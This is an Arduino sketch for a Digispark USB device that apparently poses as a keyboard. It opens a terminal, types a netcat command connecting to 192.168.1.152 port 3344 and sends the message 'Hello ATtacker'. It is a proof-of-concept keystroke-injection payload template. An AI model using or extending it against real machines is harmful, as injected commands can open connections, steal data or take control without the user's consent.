#include "DigiKeyboard.h" 
void setup() {
pinMode(0, OUTPUT); //LED on Model B
pinMode(1, OUTPUT); //LED on Model A 
}
void loop(){ 



DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("netcat 192.168.1.152 3344");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("Hello ATtacker");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.sendKeyStroke(KEY_D, MOD_CONTROL_LEFT);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

//end of your payload

while(1) {
//Flashes the LED when the program is complete 
digitalWrite(0, HIGH);
digitalWrite(1, HIGH);
DigiKeyboard.delay(100);
digitalWrite(0, LOW);
digitalWrite(1, LOW);
DigiKeyboard.delay(100);
} //makes the code run once (if you want it to loop, remove this line)
} 
